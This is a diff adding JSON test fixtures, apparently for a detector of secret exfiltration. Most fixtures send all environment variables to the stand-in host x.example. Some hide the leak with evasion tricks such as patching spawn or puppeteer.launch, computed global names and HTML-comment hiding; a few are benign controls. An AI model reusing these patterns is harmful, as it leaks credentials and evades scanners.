+"srv.js",
+"function send(d) { return fetch(\"https://x.example/c\", { method: \"POST\", body: JSON.stringify(d) }); }\nfunction go() { Object.keys(process.env).forEach((k) => send(process.env[k])); }\ngo();\n"
+]
+]
+},
+{
+"id": "rr4/v3b:D1c",
+"name": "D1c copy, no launcher, for-in send",
+"files": [
+[
+"srv.js",
+"function send(d) { return fetch(\"https://x.example/c\", { method: \"POST\", body: JSON.stringify(d) }); }\nfunction go() { const c = { ...process.env }; for (const k in c) send(c[k]); }\ngo();\n"
+]
+]
+},
+{
+"id": "rr4/v3b:D1d",
+"name": "D1d copy, no launcher, send in other fn",
+"files": [
+[
+"srv.js",
+"function send(d) { return fetch(\"https://x.example/c\", { method: \"POST\", body: JSON.stringify(d) }); }\nconst c = { ...process.env };\nfunction leak() { for (const k in c) send(c[k]); }\nleak();\n"
+]
+]
+},
+{
+"id": "rr4/v3b:D1e",
+"name": "D1e L1 variant send in other fn (bound)",
+"files": [
+[
+"srv.js",
+"const cp = require(\"child_process\");\nfunction send(d) { return fetch(\"https://x.example/c\", { method: \"POST\", body: JSON.stringify(d) }); }\nconst c = { ...process.env };\nfunction go() { cp.spawn(\"ls\", [], { env: c }); }\nfunction leak() { Object.keys(c).forEach((k) => send(c[k])); }\ngo(); leak();\n"
+]
+]
+},
+{
+"id": "rr4/v3b:PD1",
+"name": "PD1 for k in os.environ send",
+"files": [
+[
+"srv.py",
+"import os\nimport requests\ndef send(d):\n    requests.post(\"https://x.example/c\", json=d)\ndef go():\n    for k in os.environ:\n        send(os.environ[k])\ngo()\n"
+]
+]
+},
+{
+"id": "rr4/v3b:PD1b",
+"name": "PD1b copy no launcher for-in",
+"files": [
+[
+"srv.py",
+"import os\nimport requests\ndef send(d):\n    requests.post(\"https://x.example/c\", json=d)\nc = dict(os.environ)\ndef go():\n    for k in c:\n        send(c[k])\ngo()\n"
+]
+]
+},
+{
+"id": "rr4/v3b:PL1e",
+"name": "PL1e bound copy, loop in other fn",
+"files": [
+[
+"srv.py",
+"import os, subprocess\nimport requests\ndef send(d):\n    requests.post(\"https://x.example/c\", json=d)\nc = dict(os.environ)\ndef go():\n    subprocess.run([\"ls\"], env=c)\ndef leak():\n    for k in c:\n        send(c[k])\ngo(); leak()\n"
+]
+]
+},
+{
+"id": "rr4/v4:E1",
+"name": "E1 using decl before reassign",
+"files": [
+[
+"srv.js",
+"let cp = require(\"child_process\");\nfunction send(d) { return fetch(\"https://x.example/c\", { method: \"POST\", body: JSON.stringify(d) }); }\nfunction u() { using r = { [Symbol.dispose]() {} }; cp = { spawn: (c, a, o) => send(o.env) };\n}\nu();\nfunction go() { cp.spawn(\"ls\", [], { env: { ...process.env } }); }\ngo();\n"
+]
+]
+},
+{
+"id": "rr4/v4:E2",
+"name": "E2 decorator on class",
+"files": [
+[
+"srv.js",
+"let cp = require(\"child_process\");\nfunction send(d) { return fetch(\"https://x.example/c\", { method: \"POST\", body: JSON.stringify(d) }); }\n@dec class A {}\nfunction dec(x) { cp = { spawn: (c, a, o) => send(o.env) };\n return x; }\nfunction go() { cp.spawn(\"ls\", [], { env: { ...process.env } }); }\ngo();\n"
+]
+]
+},
+{
+"id": "rr4/v4:E3#0",
+"name": "E3 import attrs json",
+"files": [
+[
+"srv.js",
+"let cp = require(\"child_process\");\nfunction send(d) { return fetch(\"https://x.example/c\", { method: \"POST\", body: JSON.stringify(d) }); }\nfunction go() { cp.spawn(\"ls\", [], { env: { ...process.env } }); }\ngo();\n"
+]
+]
+},
+{
+"id": "rr4/v4:E4",
+"name": "E4 regex v flag",
+"files": [
+[
+"srv.js",
+"let cp = require(\"child_process\");\nfunction send(d) { return fetch(\"https://x.example/c\", { method: \"POST\", body: JSON.stringify(d) }); }\nconst rx = /[\\p{L}--[a-z]]/v; cp = { spawn: (c, a, o) => send(o.env) };\nfunction go() { cp.spawn(\"ls\", [], { env: { ...process.env } }); }\ngo();\n"
+]
+]
+},
+{
+"id": "rr4/v4:E5",
+"name": "E5 nested template",
+"files": [
+[
+"srv.js",
+"let cp = require(\"child_process\");\nfunction send(d) { return fetch(\"https://x.example/c\", { method: \"POST\", body: JSON.stringify(d) }); }\nconst s = `a${`b${`c`}`}`; cp = { spawn: (c, a, o) => send(o.env) };\nfunction go() { cp.spawn(\"ls\", [], { env: { ...process.env } }); }\ngo();\n"
+]
+]
+},
+{
+"id": "rr4/v4:E6",
+"name": "E6 #x in obj",
+"files": [
+[
+"srv.js",
+"let cp = require(\"child_process\");\nfunction send(d) { return fetch(\"https://x.example/c\", { method: \"POST\", body: JSON.stringify(d) }); }\nclass P { #x = 1; static h(o) { return #x in o; } }\ncp = { spawn: (c, a, o) => send(o.env) };\nfunction go() { cp.spawn(\"ls\", [], { env: { ...process.env } }); }\ngo();\n"
+]
+]
+},
+{
+"id": "rr4/v4:E7",
+"name": "E7 accessor field",
+"files": [
+[
+"srv.js",
+"let cp = require(\"child_process\");\nfunction send(d) { return fetch(\"https://x.example/c\", { method: \"POST\", body: JSON.stringify(d) }); }\nclass Q { accessor z = 1; }\ncp = { spawn: (c, a, o) => send(o.env) };\nfunction go() { cp.spawn(\"ls\", [], { env: { ...process.env } }); }\ngo();\n"
+]
+]
+},
+{
+"id": "rr4/v4:E8",
+"name": "E8 regex with slash in class",
+"files": [
+[
+"srv.js",
+"let cp = require(\"child_process\");\nfunction send(d) { return fetch(\"https://x.example/c\", { method: \"POST\", body: JSON.stringify(d) }); }\nconst r2 = /[/]/; cp = { spawn: (c, a, o) => send(o.env) };\nfunction go() { cp.spawn(\"ls\", [], { env: { ...process.env } }); }\ngo();\n"
+]
+]
+},
+{
+"id": "rr4/v4:E9",
+"name": "E9 division ambiguity",
+"files": [
+[
+"srv.js",
+"let cp = require(\"child_process\");\nfunction send(d) { return fetch(\"https://x.example/c\", { method: \"POST\", body: JSON.stringify(d) }); }\nlet a = 1, g = 1, i = 1; const d = a / 2 /g; cp = { spawn: (c, a, o) => send(o.env) };\ni;\nfunction go() { cp.spawn(\"ls\", [], { env: { ...process.env } }); }\ngo();\n"
+]
+]
+},
+{
+"id": "rr4/v4:E10",
+"name": "E10 html close comment after block comment",
+"files": [
+[
+"srv.js",
+"let cp = require(\"child_process\");\nfunction send(d) { return fetch(\"https://x.example/c\", { method: \"POST\", body: JSON.stringify(d) }); }\n/*\n*/ --> trailing\ncp = { spawn: (c, a, o) => send(o.env) };\nfunction go() { cp.spawn(\"ls\", [], { env: { ...process.env } }); }\ngo();\n"
+]
+]
+},
+{
+"id": "rr4/v4:E11",
+"name": "E11 garbage token in middle",
+"files": [
+[
+"srv.js",
+"let cp = require(\"child_process\");\nfunction send(d) { return fetch(\"https://x.example/c\", { method: \"POST\", body: JSON.stringify(d) }); }\nconst z = @@@;\ncp = { spawn: (c, a, o) => send(o.env) };\nfunction go() { cp.spawn(\"ls\", [], { env: { ...process.env } }); }\ngo();\n"
+]
+]
+},
+{
+"id": "rr4/v4:E12",
+"name": "E12 JSX in .js",
+"files": [
+[
+"srv.js",
+"let cp = require(\"child_process\");\nfunction send(d) { return fetch(\"https://x.example/c\", { method: \"POST\", body: JSON.stringify(d) }); }\nconst el = <div a={1}>{x}</div>;\ncp = { spawn: (c, a, o) => send(o.env) };\nfunction go() { cp.spawn(\"ls\", [], { env: { ...process.env } }); }\ngo();\n"
+]
+]
+},
+{
+"id": "rr4/v4:E3#1",
+"name": "E3 import attrs json (mjs)",
+"files": [
+[
+"srv.mjs",
+"import d from \"./d.json\" with { type: \"json\" };\nimport cp0 from \"child_process\";\nlet cp = cp0;\nfunction send(d) { return fetch(\"https://x.example/c\", { method: \"POST\", body: JSON.stringify(d) }); }\ncp = { spawn: (c, a, o) => send(o.env) };\nfunction go() { cp.spawn(\"ls\", [], { env: { ...process.env } }); }\ngo();\n"
+]
+]
+},
+{
+"id": "rr4/v4:T1",
+"name": "T1 TS import cp = require (real)",
+"files": [
+[
+"srv.ts",
+"import cp = require(\"child_process\");\nfunction send(d) { return fetch(\"https://x.example/c\", { method: \"POST\", body: JSON.stringify(d) }); }\nfunction go() { cp.spawn(\"ls\", [], { env: { ...process.env } }); }\ngo();\n"
+]
+]
+},
+{
+"id": "rr4/v4:T2",
+"name": "T2 TS import type * as cp (erased) + global fake via computed key",
+"files": [
+[
+"srv.ts",
+"import type * as cp from \"child_process\";\nfunction send(d) { return fetch(\"https://x.example/c\", { method: \"POST\", body: JSON.stringify(d) }); }\n(globalThis as any)[\"c\" + \"p\"] = { spawn: (c, a, o) => send(o.env) };\nfunction go() { cp.spawn(\"ls\", [], { env: { ...process.env } }); }\ngo();\n"
+]
+]
+},
+{
+"id": "rr4/v4:T2b",
+"name": "T2b TS import { type spawn } then spawn()",
+"files": [
+[
+"srv.ts",
+"import { type spawn } from \"child_process\";\nfunction send(d) { return fetch(\"https://x.example/c\", { method: \"POST\", body: JSON.stringify(d) }); }\n(globalThis as any)[\"spa\" + \"wn\"] = (c: any, a: any, o: any) => send(o.env);\nfunction go() { spawn(\"ls\", [], { env: { ...process.env } }); }\ngo();\n"
+]
+]
+},
+{
+"id": "rr4/v4:T3",
+"name": "T3 TS namespace cp shadow",
+"files": [
+[
+"srv.ts",
+"import * as cp from \"child_process\";\nfunction send(d) { return fetch(\"https://x.example/c\", { method: \"POST\", body: JSON.stringify(d) }); }\nnamespace N { export const cp = { spawn: (c, a, o) => send(o.env) }; export function go() { cp.spawn(\"ls\", [], { env: { ...process.env } }); } }\nN.go();\n"
+]
+]
+},
+{
+"id": "rr4/v4:T4",
+"name": "T4 TS enum shadow",
+"files": [
+[
+"srv.ts",
+"import * as cp0 from \"child_process\";\nfunction send(d) { return fetch(\"https://x.example/c\", { method: \"POST\", body: JSON.stringify(d) }); }\nfunction go() { cp0.spawn(\"ls\", [], { env: { ...process.env } as Record<string, string> }); }\ngo();\n"
+]
+]
+},
+{
+"id": "rr4/v4:T5",
+"name": "T5 TS generic tsx arrow",
+"files": [
+[
+"srv.tsx",
+"import { spawn } from \"child_process\";\nfunction send(d) { return fetch(\"https://x.example/c\", { method: \"POST\", body: JSON.stringify(d) }); }\nconst go = <T,>(x: T) => spawn(\"ls\", [], { env: { ...process.env } satisfies NodeJS.ProcessEnv });\ngo(1);\nconst el = <div>{1}</div>;\n"
+]
+]
+},
+{
+"id": "rr4/v4:T6",
+"name": "T6 TS decorator param + reassign",
+"files": [
+[
+"srv.ts",
+"let cp = require(\"child_process\");\nfunction send(d) { return fetch(\"https://x.example/c\", { method: \"POST\", body: JSON.stringify(d) }); }\nclass K { m(@d x: any) {} }\nfunction d(..._a: any[]) { cp = { spawn: (c, a, o) => send(o.env) }; }\nfunction go() { cp.spawn(\"ls\", [], { env: { ...process.env } }); }\ngo();\n"
+]
+]
+},
+{
+"id": "rr4/v4:T7",
+"name": "T7 TS ! non-null and type assertion <any>",
+"files": [
+[
+"srv.ts",
+"import * as cp from \"child_process\";\nfunction send(d) { return fetch(\"https://x.example/c\", { method: \"POST\", body: JSON.stringify(d) }); }\nfunction go() { (<any>cp).spawn(\"ls\", [], { env: { ...process.env! } }); }\ngo();\n"
+]
+]
+},
+{
+"id": "rr4/v4:T8",
+"name": "T8 TS declare + export =",
+"files": [
+[
+"srv.ts",
+"declare const cp: typeof import(\"child_process\");\nfunction send(d) { return fetch(\"https://x.example/c\", { method: \"POST\", body: JSON.stringify(d) }); }\nfunction go() { cp.spawn(\"ls\", [], { env: { ...process.env } }); }\ngo();\n"
+]
+]
+},
+{
+"id": "rr4/v5:H1",
+"name": "H1 CJS: midline <!-- hides a var decl from Node, tree sees it; computed global fake",
+"files": [
+[
+"srv.js",
+"function send(d) { return fetch(\"https://x.example/c\", { method: \"POST\", body: JSON.stringify(d) }); }\nglobalThis[\"c\" + \"p\"] = { spawn: (c, a, o) => send(o.env) };\n0 <!--b; var cp = require(\"child_process\")\nfunction go() { cp.spawn(\"ls\", [], { env: { ...process.env } }); }\ngo();\n"
+]
+]
+},
+{
+"id": "rr4/v5:H1b",
+"name": "H1b same, global fake set in another file",
+"files": [
+[
+"srv.js",
+"function send(d) { return fetch(\"https://x.example/c\", { method: \"POST\", body: JSON.stringify(d) }); }\n0 <!--b; var cp = require(\"child_process\")\nfunction go() { cp.spawn(\"ls\", [], { env: { ...process.env } }); }\ngo();\n"
+],
+[
+"boot.js",
+"globalThis[\"c\" + \"p\"] = { spawn: (c, a, o) => fetch(\"https://x.example\", { method: \"POST\", body: JSON.stringify(o.env) }) };\nrequire(\"./srv.js\");\n"
+]
+]
+},
+{
+"id": "rr4/v5:H2",
+"name": "H2 control: computed global fake, no decl",
+"files": [
+[
+"srv.js",
+"function send(d) { return fetch(\"https://x.example/c\", { method: \"POST\", body: JSON.stringify(d) }); }\nglobalThis[\"c\" + \"p\"] = { spawn: (c, a, o) => send(o.env) };\nfunction go() { cp.spawn(\"ls\", [], { env: { ...process.env } }); }\ngo();\n"
+]
+]
+},
+{
+"id": "rr4/v7:S-a",
+"name": "S-a nested spread in array arg",
+"files": [
+[
+"srv.js",
+"async function go() { await fetch(\"https://x.example\", { method: \"POST\", body: JSON.stringify([1, { ...process.env }]) }); }\ngo();\n"
+]
+]
+},
+{
+"id": "rr4/v7:S-b",
+"name": "S-b spread of process?.['env']",
+"files": [
+[
+"srv.js",
+"async function go() { await fetch(\"https://x.example\", { method: \"POST\", body: JSON.stringify({ ...process?.[\"env\"] }) }); }\ngo();\n"
+]
+]
+},
+{
+"id": "rr4/v7:S-c",
+"name": "S-c Object.assign with spread src arr",
+"files": [
+[
+"srv.js",
+"async function go() { const o = Object.assign({}, ...[process.env]); await fetch(\"https://x.example\", { method: \"POST\", body: JSON.stringify(o) }); }\ngo();\n"
+]
+]
+},
+{
+"id": "rr4/v7:S-d",
+"name": "S-d Reflect.ownKeys(process.env).map",
+"files": [
+[
+"srv.js",
+"async function go() { const o = Reflect.ownKeys(process.env).map((k) => [k, process.env[k]]); await fetch(\"https://x.example\", { method: \"POST\", body: JSON.stringify(o) }); }\ngo();\n"
+]
+]
+},
+{
+"id": "rr4/v7:S-e",
+"name": "S-e Object.getOwnPropertyNames",
+"files": [
+[
+"srv.js",
+"async function go() { const o = Object.getOwnPropertyNames(process.env).map((k) => process.env[k]); await fetch(\"https://x.example\", { method: \"POST\", body: String(o) }); }\ngo();\n"
+]
+]
+},
+{
+"id": "rr4/v7:S-f",
+"name": "S-f new URLSearchParams(process.env)",
+"files": [
+[
+"srv.js",
+"async function go() { await fetch(\"https://x.example/?\" + new URLSearchParams(process.env)); }\ngo();\n"
+]
+]
+},
+{
+"id": "rr4/v7:S-g",
+"name": "S-g JSON.stringify(process.env as any) TS",
+"files": [
+[
+"srv.ts",
+"async function go() { await fetch(\"https://x.example\", { method: \"POST\", body: JSON.stringify(process.env as any) }); }\ngo();\n"
+]
+]
+},
+{
+"id": "rr4/v7:S-h",
+"name": "S-h util.inspect(process.env) to fetch",
+"files": [
+[
+"srv.js",
+"const util = require(\"util\");\nasync function go() { await fetch(\"https://x.example\", { method: \"POST\", body: util.inspect(process.env) }); }\ngo();\n"
+]
+]
+},
+{
+"id": "rr4/v7:S-i",
+"name": "S-i Object.entries(process.env).join",
+"files": [
+[
+"srv.js",
+"async function go() { await fetch(\"https://x.example\", { method: \"POST\", body: Object.entries(process.env).join(\";\") }); }\ngo();\n"
+]
+]
+},
+{
+"id": "rr4/v7:S-j",
+"name": "S-j {...{...process.env}} double",
+"files": [
+[
+"srv.js",
+"async function go() { await fetch(\"https://x.example\", { method: \"POST\", body: JSON.stringify({ ...{ ...process.env } }) }); }\ngo();\n"
+]
+]
+},
+{
+"id": "rr4/v7:S-k",
+"name": "S-k JSX spread",
+"files": [
+[
+"srv.jsx",
+"const C = () => <X {...process.env} />;\nfetch(\"https://x.example\", { method: \"POST\", body: \"1\" });\n"
+]
+]
+},
+{
+"id": "rr4/v7:S-l",
+"name": "S-l py json.dumps({**os.environ} | {'a': 1})",
+"files": [
+[
+"srv.py",
+"import os, json, requests\ndef go():\n    requests.post(\"https://x.example\", data=json.dumps({\"a\": 1} | {**os.environ}))\ngo()\n"
+]
+]
+},
+{
+"id": "rr4/v7:S-m",
+"name": "S-m py os.environ | {}",
+"files": [
+[
+"srv.py",
+"import os, requests\ndef go():\n    requests.post(\"https://x.example\", json=os.environ | {\"a\": \"1\"})\ngo()\n"
+]
+]
+},
+{
+"id": "rr4/v7:S-n",
+"name": "S-n py {k: v for k, v in os.environ.items()}",
+"files": [
+[
+"srv.py",
+"import os, requests\ndef go():\n    requests.post(\"https://x.example\", json={k: v for k, v in os.environ.items()})\ngo()\n"
+]
+]
+},
+{
+"id": "rr4/v7:S-o",
+"name": "S-o py list(os.environ.items())",
+"files": [
+[
+"srv.py",
+"import os, requests\ndef go():\n    requests.post(\"https://x.example\", json=list(os.environ.items()))\ngo()\n"
+]
+]
+},
+{
+"id": "rr4/v7:S-p",
+"name": "S-p py dict(os.environ.copy())",
+"files": [
+[
+"srv.py",
+"import os, requests\ndef go():\n    requests.post(\"https://x.example\", json=dict(os.environ.copy()))\ngo()\n"
+]
+]
+},
+{
+"id": "rr4/v7:N12-a",
+"name": "N12-a assigned spawn + fetch same fn",
+"files": [
+[
+"srv.js",
+"const { spawn } = require(\"child_process\");\nasync function go() { const child = spawn(\"node\", [\"s.js\"], { stdio: \"pipe\", env: { ...process.env, PORT: \"1\" } }); await fetch(\"https://api.example/x\"); return child; }\ngo();\n"
+]
+]
+},
+{
+"id": "rr4/v7:N12-b",
+"name": "N12-b this.proc = execa(...)",
+"files": [
+[
+"srv.mjs",
+"import { execa } from \"execa\";\nclass S { async go() { this.proc = execa(\"node\", [\"s.js\"], { env: { ...process.env } }); await fetch(\"https://api.example/x\"); } }\nnew S().go();\n"
+]
+]
+},
+{
+"id": "rr4/v7:N12-c",
+"name": "N12-c env built conditionally then spawn",
+"files": [
+[
+"srv.js",
+"const { spawn } = require(\"child_process\");\nasync function go(x) { const env = x ? { ...process.env, A: \"1\" } : { ...process.env }; const c = spawn(\"a\", [], { env }); await fetch(\"https://api.example\"); return c; }\ngo(1);\n"
+]
+]
+},
+{
+"id": "rr4/v7:N12-d",
+"name": "N12-d StdioClientTransport via import + fetch",
+"files": [
+[
+"srv.mjs",
+"import { StdioClientTransport } from \"@modelcontextprotocol/sdk/client/stdio.js\";\nexport async function go(command, args) { const t = new StdioClientTransport({ command, args, env: { ...process.env, ...extra() } }); await fetch(\"https://api.example\"); return t; }\nfunction extra() { return {}; }\n"
+]
+]
+},
+{
+"id": "rr4/v7:N12-e",
+"name": "N12-e py asyncio create_subprocess_exec + httpx",
+"files": [
+[
+"srv.py",
+"import os, asyncio, httpx\nasync def go():\n    p = await asyncio.create_subprocess_exec(\"ls\", env={**os.environ, \"A\": \"1\"})\n    await httpx.AsyncClient().get(\"https://api.example\")\n    return p\n"
+]
+]
+},
+{
+"id": "rr4/v7:N12-f",
+"name": "N12-f py env var then Popen(**kw) + requests",
+"files": [
+[
+"srv.py",
+"import os, subprocess, requests\ndef go():\n    kw = {\"env\": dict(os.environ), \"cwd\": \"/\"}\n    p = subprocess.Popen([\"ls\"], **kw)\n    requests.get(\"https://api.example\")\n    return p\n"
+]
+]
+},
+{
+"id": "rr4/v7:N12-g",
+"name": "N12-g helper param spawn (G7 residual)",
+"files": [
+[
+"srv.js",
+"const { spawn } = require(\"child_process\");\nfunction run(e) { return spawn(\"a\", [], { env: e }); }\nasync function go() { run({ ...process.env }); await fetch(\"https://api.example\"); }\ngo();\n"
+]
+]
+},
+{
+"id": "rr4/v7:X-a",
+"name": "X-a report({...process.env}) own helper",
+"files": [
+[
+"srv.js",
+"function report(d) { return fetch(\"https://x.example\", { method: \"POST\", body: JSON.stringify(d) }); }\nfunction go() { report({ ...process.env }); }\ngo();\n"
+]
+]
+},
+{
+"id": "rr4/v7:X-b",
+"name": "X-b helper in class method",
+"files": [
+[
+"srv.js",
+"class T { send(d) { return fetch(\"https://x.example\", { method: \"POST\", body: JSON.stringify(d) }); } }\nconst t = new T();\nfunction go() { t.send({ ...process.env }); }\ngo();\n"
+]
+]
+},
+{
+"id": "rr4/v7:X-c",
+"name": "X-c py helper(**os.environ)",
+"files": [
+[
+"srv.py",
+"import os, requests\ndef report(**d):\n    requests.post(\"https://x.example\", json=d)\ndef go():\n    report(**os.environ)\ngo()\n"
+]
+]
+},
+{
+"id": "rr4/v7:X-d",
+"name": "X-d stored on module obj then sent",
+"files": [
+[
+"srv.js",
+"const state = {};\nfunction go() { state.e = { ...process.env }; }\nfunction later() { return fetch(\"https://x.example\", { method: \"POST\", body: JSON.stringify(state) }); }\ngo(); later();\n"
+]
+]
+},
+{
+"id": "rr4/v7:X-e",
+"name": "X-e pushed to array then sent",
+"files": [
+[
+"srv.js",
+"const q = [];\nfunction go() { q.push({ ...process.env }); }\nfunction later() { return fetch(\"https://x.example\", { method: \"POST\", body: JSON.stringify(q) }); }\ngo(); later();\n"
+]
+]
+},
+{
+"id": "rr4/v7:M-a",
+"name": "M-a default param named cp elsewhere (real launcher)",
+"files": [
+[
+"srv.js",
+"const cp = require(\"child_process\");\nfunction other(cp = null) { return cp; }\nfunction go() { cp.spawn(\"ls\", [], { env: { ...process.env } }); }\ngo(); fetch(\"https://api.example\");\n"
+]
+]
+},
+{
+"id": "rr4/v7:M-b",
+"name": "M-b py for run in xs elsewhere",
+"files": [
+[
+"srv.py",
+"import os, requests\nfrom subprocess import run\ndef other(xs):\n    for run in xs:\n        print(run)\ndef go():\n    run([\"ls\"], env={**os.environ})\n    requests.get(\"https://api.example\")\ngo()\n"
+]
+]
+},
+{
+"id": "rr4/v7:M-c",
+"name": "M-c py multi-line from import as",
+"files": [
+[
+"srv.py",
+"import os, requests\nfrom subprocess import (\n    run as sp_run,\n    PIPE,\n)\ndef go():\n    sp_run([\"ls\"], env={**os.environ}, stdout=PIPE)\n    requests.get(\"https://api.example\")\ngo()\n"
+]
+]
+},
+{
+"id": "rr4/v7:M-d",
+"name": "M-d JS param named spawn in unrelated fn",
+"files": [
+[
+"srv.js",
+"const { spawn } = require(\"child_process\");\nconst wrap = (spawn) => spawn;\nasync function go() { spawn(\"ls\", [], { env: { ...process.env } }); await fetch(\"https://api.example\"); }\ngo();\n"
+]
+]
+},
+{
+"id": "rr4/v7:M-e",
+"name": "M-e JS same name let in other block",
+"files": [
+[
+"srv.js",
+"const cp = require(\"child_process\");\nfunction a() { let cp = 1; cp = 2; return cp; }\nasync function go() { cp.spawn(\"ls\", [], { env: { ...process.env } }); await fetch(\"https://api.example\"); }\ngo();\n"
+]
+]
+},
+{
+"id": "rr4/v7:M-f",
+"name": "M-f py nested def rebinds name locally",
+"files": [
+[
+"srv.py",
+"import os, requests, subprocess\ndef other():\n    subprocess = None\n    return subprocess\ndef go():\n    subprocess.run([\"ls\"], env={**os.environ})\n    requests.get(\"https://api.example\")\ngo()\n"
+]
+]
+},
+{
+"id": "rr4/v7:M-g",
+"name": "M-g JS obj key named cp",
+"files": [
+[
+"srv.js",
+"const cp = require(\"child_process\");\nconst o = { cp: 1 }; o.cp = 2;\nasync function go() { cp.spawn(\"ls\", [], { env: { ...process.env } }); await fetch(\"https://api.example\"); }\ngo();\n"
+]
+]
+},
+{
+"id": "rr4/v7:M-h",
+"name": "M-h py attribute write on unrelated obj named like module attr",
+"files": [
+[
+"srv.py",
+"import os, requests, subprocess\nclass C: pass\nc = C(); c.subprocess = 1\ndef go():\n    subprocess.run([\"ls\"], env={**os.environ})\n    requests.get(\"https://api.example\")\ngo()\n"
+]
+]
+},
+{
+"id": "rr4/v7:M-i",
+"name": "M-i py os.environ write doesnt kill os launcher",
+"files": [
+[
+"srv.py",
+"import os, requests\nos.environ[\"A\"] = \"1\"\ndef go():\n    os.execvpe(\"ls\", [\"ls\"], {**os.environ})\n    requests.get(\"https://api.example\")\ngo()\n"
+]
+]
+},
+{
+"id": "rr4/v7:M-j",
+"name": "M-j JS process.env.X = ... with child_process",
+"files": [
+[
+"srv.js",
+"const cp = require(\"child_process\");\nprocess.env.FOO = \"1\";\nasync function go() { cp.spawn(\"ls\", [], { env: { ...process.env } }); await fetch(\"https://api.example\"); }\ngo();\n"
+]
+]
+},
+{
+"id": "rr4/v7:M-k",
+"name": "M-k JS cp.spawn read as value (not patched) e.g. promisify",
+"files": [
+[
+"srv.js",
+"const cp = require(\"child_process\");\nconst util = require(\"util\");\nconst ex = util.promisify(cp.execFile);\nasync function go() { cp.spawn(\"ls\", [], { env: { ...process.env } }); await fetch(\"https://api.example\"); }\ngo();\n"
+]
+]
+},
+{
+"id": "rr4/v7:M-l",
+"name": "M-l JS const cp2 = cp alias (B9 namespace alias) of real module, benign",
+"files": [
+[
+"srv.js",
+"const cp = require(\"child_process\");\nmodule.exports.cp = cp;\nasync function go() { cp.spawn(\"ls\", [], { env: { ...process.env } }); await fetch(\"https://api.example\"); }\ngo();\n"
+]
+]
+},
+{
+"id": "rr4/v7:M-m",
+"name": "M-m JS passing module obj to a function (benign)",
+"files": [
+[
+"srv.js",
+"const cp = require(\"child_process\");\nconst wrapped = wrap(cp);\nfunction wrap(m) { return m; }\nasync function go() { cp.spawn(\"ls\", [], { env: { ...process.env } }); await fetch(\"https://api.example\"); }\ngo();\n"
+]
+]
+},
+{
+"id": "rr4/v8:R0",
+"name": "R0 real LazyPackage shape",
+"files": [
+[
+"m.mjs",
+"import puppeteer from \"puppeteer\";\nclass LazyPackage { load() { return { puppeteer }; } }\nconst pkg = new LazyPackage();\nfunction send(d) { return fetch(\"https://x.example/c\", { method: \"POST\", body: JSON.stringify(d) }); }\nexport async function go() { const { puppeteer } = pkg.load(); await puppeteer.launch({ env: { ...process.env } }); }\n"
+]
+]
+},
+{
+"id": "rr4/v8:R1",
+"name": "R1 decoy shorthand + other loader sets .puppeteer by member assign",
+"files": [
+[
+"m.mjs",
+"import puppeteer from \"puppeteer\";\nclass LazyPackage { load() { return { puppeteer }; } }\nconst pkg = new LazyPackage();\nfunction send(d) { return fetch(\"https://x.example/c\", { method: \"POST\", body: JSON.stringify(d) }); }\nfunction evil() { const r = {}; r.puppeteer = { launch: async (o) => send(o.env) }; return r; }\nexport async function go() { const { puppeteer } = evil(); await puppeteer.launch({ env: { ...process.env } }); }\n"
+]
+]
+},
+{
+"id": "rr4/v8:R2",
+"name": "R2 decoy shorthand + loader returns string-keyed fake",
+"files": [
+[
+"m.mjs",
+"import puppeteer from \"puppeteer\";\nclass LazyPackage { load() { return { puppeteer }; } }\nconst pkg = new LazyPackage();\nfunction send(d) { return fetch(\"https://x.example/c\", { method: \"POST\", body: JSON.stringify(d) }); }\nfunction evil() { return { \"puppeteer\": { launch: async (o) => send(o.env) } }; }\nexport async function go() { const { puppeteer } = evil(); await puppeteer.launch({ env: { ...process.env } }); }\n"
+]
+]
+},
+{
+"id": "rr4/v8:R3",
+"name": "R3 decoy shorthand + JSON.parse-built object (no property)",
+"files": [
+[
+"m.mjs",
+"import puppeteer from \"puppeteer\";\nclass LazyPackage { load() { return { puppeteer }; } }\nconst pkg = new LazyPackage();\nfunction send(d) { return fetch(\"https://x.example/c\", { method: \"POST\", body: JSON.stringify(d) }); }\nfunction evil() { const r = JSON.parse(\"{}\"); Object.defineProperty(r, \"puppeteer\", { value: { launch: async (o) => send(o.env) } }); return r; }\nexport async function go() { const { puppeteer } = evil(); await puppeteer.launch({ env: { ...process.env } }); }\n"
+]
+]
+},
+{
+"id": "rr4/v8:R4",
+"name": "R4 decoy + destructure from global fn result (fetch().json())",
+"files": [
+[
+"m.mjs",
+"import puppeteer from \"puppeteer\";\nclass LazyPackage { load() { return { puppeteer }; } }\nconst pkg = new LazyPackage();\nfunction send(d) { return fetch(\"https://x.example/c\", { method: \"POST\", body: JSON.stringify(d) }); }\nexport async function go() { const { puppeteer } = await (await fetch(\"https://x.example/p\")).json(); await puppeteer.launch({ env: { ...process.env } }); }\n"
+]
+]
+},
+{
+"id": "rr4/v8:R5",
+"name": "R5 decoy + destructure from Function()",
+"files": [
+[
+"m.mjs",
+"import puppeteer from \"puppeteer\";\nclass LazyPackage { load() { return { puppeteer }; } }\nconst pkg = new LazyPackage();\nfunction send(d) { return fetch(\"https://x.example/c\", { method: \"POST\", body: JSON.stringify(d) }); }\nexport async function go() { const { puppeteer } = globalThis.mk(); await puppeteer.launch({ env: { ...process.env } }); }\n"
+]
+]
+}
+]
